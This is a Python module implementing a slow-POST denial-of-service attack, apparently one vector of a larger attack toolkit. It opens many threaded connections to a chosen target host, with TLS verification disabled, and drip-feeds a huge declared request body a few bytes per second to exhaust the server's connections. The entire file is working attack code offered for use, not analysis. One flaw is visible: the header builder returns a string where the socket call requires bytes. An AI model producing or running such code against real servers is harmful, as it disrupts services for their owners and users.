#!/usr/bin/env python3
"""
SlowPOST Vector
Send POST body very slowly to keep connections occupied
"""

import socket
import ssl
import random
import time
import threading
from typing import Optional
from ironcarrier.core.stats import StatsCollector


class Attack:
    """Slow POST attack vector"""
    
    def __init__(self, target: str, port: int, duration: int,
                 threads: int = 200, stop_event: Optional[threading.Event] = None,
                 stats: Optional[StatsCollector] = None, **kwargs):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.stop_event = stop_event or threading.Event()
        self.stats = stats or StatsCollector()
        
        self.use_ssl = kwargs.get('ssl', port == 443)
        self.body_size = kwargs.get('body_size', 1000000)
        self.chunk_size = kwargs.get('chunk_size', 10)
        self.send_interval = kwargs.get('send_interval', 1.0)
        self.timeout = kwargs.get('timeout', 30)
    
    def _build_headers(self) -> bytes:
        lines = [
            f"POST / HTTP/1.1",
            f"Host: {self.target}",
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            f"Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {self.body_size}",
            f"Connection: keep-alive",
        ]
        return '\r\n'.join(lines) + '\r\n\r\n'
    
    def _create_socket(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect((self.target, self.port))
        
        if self.use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self.target)
        
        return sock
    
    def _attack_thread(self) -> None:
        end_time = time.time() + self.duration
        sent = 0
        
        try:
            sock = self._create_socket()
            headers = self._build_headers()
            sock.sendall(headers)
            self.stats.add_packets(1, len(headers))
            self.stats.add_connection()
            
            while sent < self.body_size and time.time() < end_time and not self.stop_event.is_set():
                chunk = b'A' * min(self.chunk_size, self.body_size - sent)
                sock.sendall(chunk)
                sent += len(chunk)
                self.stats.add_packets(1, len(chunk))
                time.sleep(self.send_interval)
                
        except Exception:
            self.stats.add_error()
        finally:
            try:
                sock.close()
            except Exception:
                pass
    
    def run(self) -> None:
        threads = [threading.Thread(target=self._attack_thread, daemon=True) for _ in range(self.threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.duration + 10)
